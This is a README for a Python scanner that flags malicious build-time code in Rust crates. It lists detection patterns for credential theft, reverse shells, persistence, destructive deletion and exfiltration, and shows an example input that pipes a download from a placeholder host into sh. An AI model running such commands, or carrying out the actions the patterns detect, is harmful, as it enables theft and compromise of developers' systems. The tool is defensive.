# crate-audit

**Scan Rust crates for malicious build-time code before `cargo build` runs it.** Zero dependencies, one file, MIT.

```bash
python crate_audit.py serde                 # latest version from crates.io
python crate_audit.py some-crate@0.3.1
python crate_audit.py --lockfile Cargo.lock # every crates.io dependency
python crate_audit.py ./vendor/some-crate   # a local crate / Cargo.toml / .crate / build.rs
python crate_audit.py --text 'Command::new("sh").arg("-c").arg("curl https://x.invalid | sh")'
# 🔴 <text>  [CRITICAL]  score=25
#     CRITICAL Download & Execute  <text>:1
```

## Why this exists

`cargo build` runs third-party code on your machine **before you run your program**: every
dependency's `build.rs`, and every procedural macro while your code expands. Both run as your
user, with your environment variables, your `~/.cargo/credentials.toml`, your SSH keys and the
network. In CI they run with the deploy secrets.

| Tool | Answers |
| --- | --- |
| `cargo audit` | Does this version have a **known** RustSec advisory? |
| `cargo deny` | Licences, bans, duplicate versions, advisories |
| `cargo vet` / `cargo crev` | Has a **human** I trust reviewed this version? |
| **`crate-audit`** | Does the code that runs at build time **behave** like malware, right now? |

`crate-audit` downloads the `.crate` into memory, works out which files actually run during the
build (the build script plus every module it pulls in with `mod`, `#[path]` and `include!`, and
all of a proc-macro crate's `src/`), and scans them with build-time context. Runtime code is
scanned too: two of the known crates.io incidents ran at runtime.

## What it flags

| Pattern | Severity |
| --- | --- |
| Download & execute (`curl … \| sh`, `iex (iwr …)`, encoded PowerShell) | CRITICAL |
| Environment dump (`env::vars()` serialised) **+ a network sink** in the same file | CRITICAL |
| Credential-store read (`~/.cargo/credentials.toml`, `~/.ssh/id_*`, `~/.aws`, Solana `id.json`) **+ an exfil host / raw IP** (any network, in build code) | CRITICAL |
| Private-key regex (64-hex / base58) **+ network** in the same file (faster_log shape) | CRITICAL |
| Dropper: download / `include_bytes!` / base64 → `set_permissions` → run it (CI-gated = CRITICAL) | HIGH / CRITICAL |
| Reverse shell (socket fd wired into `sh`'s stdio, `/dev/tcp/…`) | CRITICAL |
| Persistence writes from build code (`.bashrc`, `authorized_keys`, `~/.cargo/bin`, LaunchAgents, cron) | CRITICAL |
| Worm propagation (`cargo publish --token`, crates.io publish API, TruffleHog) | CRITICAL |
| Destructive (`remove_dir_all(home_dir())`, `rm -rf ~`) | CRITICAL |
| Exfiltration hosts (Discord/Telegram/Slack webhooks, paste sites, ngrok, OAST, `workers.dev`) **+ network** | HIGH |
| Wallet / browser / Keychain theft paths | HIGH |
| DNS exfiltration (hostname / user / env encoded into a lookup) | HIGH |
| XOR-decoded byte blob that gets executed | HIGH |
| Network I/O **inside a proc-macro** (at expansion time) | HIGH |
| Build-script download with **no checksum verification** in the file | MEDIUM |
| Raw public-IP URLs, TLS verification disabled in build code | MEDIUM |

**Anything HIGH in a file that runs at `cargo build` is raised to CRITICAL.**

## Calibrated, not noisy

Build scripts *have* to run `rustc --version`, read `TARGET` and `CARGO_FEATURE_*`, drive `cc` /
`cmake` / `pkg-config` / `bindgen`, and write to `OUT_DIR`. `*-sys` crates fetch prebuilt
libraries. A scanner that scores those flags the dependencies everyone already has, and gets
switched off. Those **capabilities** go to an informational tier (`--verbose`) that never touches
the score; risk comes from **combinations** (env walk + network, credential read + network,
download + chmod + exec) and specific sinks.

Measured on the **1,599 most-downloaded crates** on crates.io (346 of them run code at build time):
a context-blind pass flags **74 (4.6%)**; `crate-audit` flags **0**. 10 inert malicious canaries,
modelled on real crates.io incidents, all fire at the right severity.
**Full results: [FINDINGS.md](FINDINGS.md).**

## Usage

```bash
python crate_audit.py <crate>[@version] [...]   # fetch from crates.io (1 API req/s, then static.crates.io)
python crate_audit.py --lockfile Cargo.lock     # every registry dependency in a lockfile
python crate_audit.py <dir|Cargo.toml|x.crate|build.rs>
python crate_audit.py --build-only ...          # only code that runs during the build
python crate_audit.py --json ...                # machine-readable
python crate_audit.py --verbose ...             # include INFO context
```

Exit code **2** if any target is HIGH or CRITICAL, so it drops straight into CI:

```yaml
- run: curl -sSLO https://raw.githubusercontent.com/eltociear/crate-audit/main/crate_audit.py
- run: python3 crate_audit.py --lockfile Cargo.lock --build-only
```

Runs on Python 3.9+ with only the standard library. Nothing is compiled, built or executed: the
`.crate` is a gzip tarball read as text.

Tests: `python tests/run.py` (10 malicious canaries, 6 benign controls, 5 unit checks).

## Related

- [mcp-audit](https://github.com/eltociear/mcp-audit): the same engine for MCP servers and AI-agent skills
- [npm-audit](https://github.com/eltociear/npm-audit): npm packages and install scripts
- [homebrew-audit](https://github.com/eltociear/homebrew-audit): Homebrew formulae, casks and taps

*Findings are pattern matches that warrant human review, not verdicts. Report suspected malicious
crates to the crates.io team (help@crates.io) and the RustSec advisory database.*

MIT licensed.
